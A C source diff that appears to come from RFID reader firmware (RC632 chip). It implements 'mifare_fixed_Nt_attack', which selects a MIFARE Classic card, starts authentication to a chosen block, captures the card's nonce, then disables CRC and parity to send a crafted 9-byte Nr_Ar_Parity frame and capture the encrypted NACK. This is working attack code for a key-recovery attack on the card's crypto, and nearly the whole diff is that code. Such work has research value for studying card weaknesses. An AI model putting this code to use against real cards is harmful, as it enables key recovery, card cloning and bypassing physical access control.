@@ -22,10 +22,22 @@
 
 u_int8_t REQA=0x26;
 u_int8_t SELECT[2]={0x93,0x20};
-u_int8_t SELECT_UID[]={0x93,0x70,0,0,0,0,0};
+u_int8_t SELECT_UID[7]={0x93,0x70,0,0,0,0,0};
+u_int8_t AUTH_BLK_N[2]={0x60, 0x00};
+u_int8_t BUFFER[16];
 //maybe we don't need a return value at all...
 int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 {
+	u_int8_t old_REG_TX_CONTROL, old_REG_CHANNEL_REDUNDANCY, old_REG_CRC_PRESET_LSB, old_REG_CRC_PRESET_MSB;
+	//store registor old values
+	opcd_rc632_reg_read(NULL, RC632_REG_TX_CONTROL, &old_REG_TX_CONTROL);
+	opcd_rc632_reg_read(NULL, RC632_REG_CHANNEL_REDUNDANCY, &old_REG_CHANNEL_REDUNDANCY);
+	opcd_rc632_reg_read(NULL, RC632_REG_CRC_PRESET_LSB, &old_REG_CRC_PRESET_LSB);
+	opcd_rc632_reg_read(NULL, RC632_REG_CRC_PRESET_MSB, &old_REG_CRC_PRESET_MSB);
+	
+	//prepare data for later use
+	AUTH_BLK_N[1]=params->BLOCK;
+	
 	//send idle command
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_IDLE);
 	
@@ -47,40 +59,81 @@ int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
 	//do the REQA tranceive
 	opcd_rc632_fifo_write(NULL, sizeof(REQA), &REQA, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//opcd_rc632_fifo_read(NULL, 2, poh->data);//read fifo, should get 0x20,00. Do we need to wait here?
+	if(opcd_rc632_fifo_read(NULL, 2, BUFFER) != 2)//read fifo, should get 0x20,00. Do we need to wait here?
+	{	//check num of bytes returned, if incorrect, exit with error code
+		params->result = -1;
+		goto exit;
+	}
 	
 	//////////////////////////////
 	//do anti collision
-	
 	//tranceive, send 0x93 20
-	//read fifo, should get UID BCC
+	opcd_rc632_fifo_write(NULL, sizeof(SELECT), SELECT, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	if(opcd_rc632_fifo_read(NULL, 5, SELECT_UID+2) != 5)//read fifo, should get UID BCC
+	{	//check num of bytes returned, if incorrect, exit with error code
+		params->result = -2;
+		goto exit;
+	}
 	
-	//enable TX CRC and parity, RX CRC disabled
-	//load crc initial value, LSB and MSB
+	
+	//enable TX CRC and odd parity, RX CRC disabled
+	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x07);
+	//load crc initial value, LSB and MSB. maybe move this to the very beginning?
+	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_LSB, 0x63);
+	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_MSB, 0x63);
 	
 	//do a tranceive: select(UID): 0x93, 70, UID, BCC 
-	//read fifo, should get SAK, with 2-byte CRC-A
+	opcd_rc632_fifo_write(NULL, sizeof(SELECT_UID), SELECT_UID, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	if(opcd_rc632_fifo_read(NULL, 3, BUFFER) != 3)//read fifo, should get SAK, with 2-byte CRC-A
+	{	//check num of bytes returned, if incorrect, exit with error code
+		params->result = -3;
+		goto exit;
+	}
 	
 	//////////////////////////////
 	//do Auth block N
-	
 	//do a tranceive: 0x60 NN CRC_A
-	//read fifo, should get 32-bit Nt
+	opcd_rc632_fifo_write(NULL, sizeof(AUTH_BLK_N), AUTH_BLK_N, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	if(opcd_rc632_fifo_read(NULL, 4, params->Nt_actual) !=4)//read fifo, should get 32-bit Nt
+	{	//check num of bytes returned, if incorrect, exit with error code
+		params->result = -4;
+		goto exit;
+	}
 	
 	//////////////////////////////
 	//send the hacking Nr_Ar_Parity
-	
 	//disable CRC and parity for TX and RX
-	
-	//do a tranceive: Nr_Ar_Parity, 9bytes with parity bits embedded in bit stream
-	//read fifo, should get NACK or nothing
+	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x00);
+	//do a tranceive: Nr_Ar_Parity, 9-bytes with parity bits embedded in bit stream
+	opcd_rc632_fifo_write(NULL, 9, params->Nr_Ar_Parity, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	switch(opcd_rc632_fifo_read(NULL, 1, &(params->NACK_encrypted)))//read fifo, should get NACK or nothing
+	{
+	case 0:
+		params->result = -6;
+		goto exit;
+		break;
+	case 1:
+		params->result = 0;
+		break;
+	default:
+		params->result = -5;
+		goto exit;
+		break;
+	}
 	
 	//////////////////////////////
 	//prepare information to return through USB
 	
-	//disable TX1 and TX2 before we leave
-	
-	
-	return 0;
+exit:	
+	// restore the old register values?
+	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, old_REG_TX_CONTROL);
+	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, old_REG_CHANNEL_REDUNDANCY);
+	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_LSB, old_REG_CRC_PRESET_LSB);
+	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_MSB, old_REG_CRC_PRESET_MSB);
+	return params->result;
 }
 
